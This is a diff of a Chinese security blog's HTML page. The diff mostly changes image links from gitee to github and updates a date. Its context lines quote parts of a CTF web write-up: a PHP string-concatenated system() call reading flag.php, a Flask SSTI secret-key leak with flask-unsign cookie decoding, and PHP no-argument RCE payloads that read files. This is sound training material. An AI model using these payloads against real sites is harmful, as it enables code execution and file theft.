@@ -291,7 +291,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/southerose/PictureBed/raw/master/img/20210409144039.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://github.com/southerose/PictureBed/raw/master/img/20210409144039.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -448,7 +448,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-06-20
+                    2022-05-28
                 </div>
                 
 
@@ -711,17 +711,17 @@ $a=sys;$b=tem;$c=$a.$b;$d='cat flag.php';$c($d);<span aria-hidden="true" class="
 <h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><blockquote>
 <p>SSTI flask</p>
 </blockquote>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210409133311.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210409133311.png"></p>
 <p>根据提示，需要以admin的方式访问flag。携带当前session访问flag不能成功的。</p>
 <p>传参数name=49，发现是SSTI。</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210409133535.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210409133535.png"></p>
 <p>然后传参?name=可以查看到，secret_key</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210409134254.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210409134254.png"></p>
 <p>后端使用的是flash框架。</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210409133630.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210409133630.png"></p>
 <p>先安装pip install flask-unsign[wordlist] 。</p>
 <p>然后在浏览器中复制当前session</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210409133934.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210409133934.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">flask-unsign --decode --cookie "eyJ1c2VybmFtZSI6eyIgYiI6IlozVmxjM1E9In19.YG_mFg.vvRMxGy5nnpJ2SWwiDAWq0E5H-s"
 {'username': b'guest'}
 
@@ -810,7 +810,7 @@ if(isset($_GET['exp'])){
 <pre class="line-numbers language-none"><code class="language-none">#获取当前目录的文件
 ?exp=var_dump(scandir(pos(localeconv())));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210409142047.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210409142047.png"></p>
 <p>接下来获取flag.php<br>payload：</p>
 <pre class="line-numbers language-none"><code class="language-none">?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -834,7 +834,7 @@ if(isset($_GET['exp'])){
 <pre class="line-numbers language-none"><code class="language-none">?exp=highlight_file(session_id(session_start()));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>BP抓包添加一行</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210410192041.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210410192041.png"></p>
 <p>然后查看响应包就能得到flag</p>
 <p>8dba5045b4638241db0f44e8727ba89e.php</p>
 
@@ -1083,7 +1083,7 @@ if(isset($_GET['exp'])){
                 <a href="/2021/04/11/netcat/">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210411180721.png" class="responsive-img" alt="netcat教程">
+                        <img src="https://github.com/southerose/PictureBed/raw/master/img/20210411180721.png" class="responsive-img" alt="netcat教程">
                         
                         <span class="card-title">netcat教程</span>
                     </div>
@@ -1135,7 +1135,7 @@ if(isset($_GET['exp'])){
                 <a href="/2021/04/05/sql-inject/">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/feature.jpg" class="responsive-img" alt="sql注入-详细步骤">
+                        <img src="https://github.com/southerose/PictureBed/raw/master/img/feature.jpg" class="responsive-img" alt="sql注入-详细步骤">
                         
                         <span class="card-title">sql注入-详细步骤</span>
                     </div>
